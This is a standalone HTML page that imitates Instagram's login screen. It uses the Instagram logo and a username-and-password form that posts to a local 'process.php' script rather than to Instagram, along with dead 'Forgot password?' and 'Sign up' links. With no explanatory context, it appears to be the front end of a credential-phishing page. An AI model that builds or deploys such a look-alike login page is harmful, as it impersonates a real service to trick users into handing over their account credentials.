<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 350px;
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 100px;
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #333;
        }
        .input-group {
            margin-bottom: 15px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #2b82d1;
        }
        .divider {
            text-align: center;
            margin: 15px 0;
            color: #999;
        }
        .forgot-password, .signup {
            text-align: center;
            font-size: 14px;
        }
        .forgot-password a, .signup a {
            color: #3897f0;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <h2>Login</h2>
        <form method="post" action="process.php">
            <div class="input-group">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn">Log In</button>
        </form>
        <p class="divider">OR</p>
        <button class="btn fb-btn">Log in with Facebook</button>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
    </div>
</body>
</html>
